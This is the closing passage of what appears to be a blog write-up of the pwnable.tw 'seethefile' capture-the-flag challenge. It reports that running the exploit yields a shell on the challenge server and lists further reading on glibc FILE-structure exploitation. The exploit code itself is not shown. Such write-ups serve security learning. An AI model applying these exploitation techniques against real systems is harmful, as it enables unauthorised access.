</span></code></pre><p>Running this gives us a shell on the remote server:</p><p><img alt="" src="https://blog.srikavin.me/posts/pwnable-tw-seethefile/5e81ac654304800866d6917d.png"></p><h1 id="further-reading">Further Reading</h1><p>These are some resources I found helpful while solving this challenge.</p><ol><li><a href="https://elixir.bootlin.com/glibc/glibc-2.23/source">https://elixir.bootlin.com/glibc/glibc-2.23/source</a></li><li><a href="https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique">https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique</a></li><li><a href="https://gsec.hitb.org/materials/sg2018/WHITEPAPERS/FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf">https://gsec.hitb.org/materials/sg2018/WHITEPAPERS/FILE%20Structures%20-%20Another%20Binary%20Exploitation%20Technique%20-%20An-Jie%20Yang.pdf</a></li></ol></div></div><script src="https://utteranc.es/client.js" async crossorigin="anonymous" issue-term="url" label="💬comments" repo="srikavin/blog" theme="github-light"></script></div></section><script src="/bundle.js"></script></body></html>